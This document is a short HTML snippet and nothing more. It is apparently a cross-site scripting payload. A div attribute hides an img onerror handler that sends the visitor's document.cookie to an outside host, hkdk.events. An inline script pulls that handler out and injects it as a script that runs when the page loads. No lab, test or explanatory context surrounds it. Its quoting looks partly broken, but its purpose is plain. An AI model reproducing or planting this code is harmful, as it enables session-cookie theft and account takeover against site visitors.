<div data-payload="<img src='x' onerror='let xhr = new XMLHttpRequest(); xhr.open('POST', 'https://hkdk.events/4m802p9trls04o'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({content: document.cookie}));'>"></div>
<script>
  const payload = document.querySelector('[data-payload]').getAttribute('data-payload');
  const script = document.createElement('script');
  script.textContent = payload.substring(payload.indexOf('onerror=') + 8, payload.lastIndexOf('"'));
  document.body.appendChild(script);
</script>
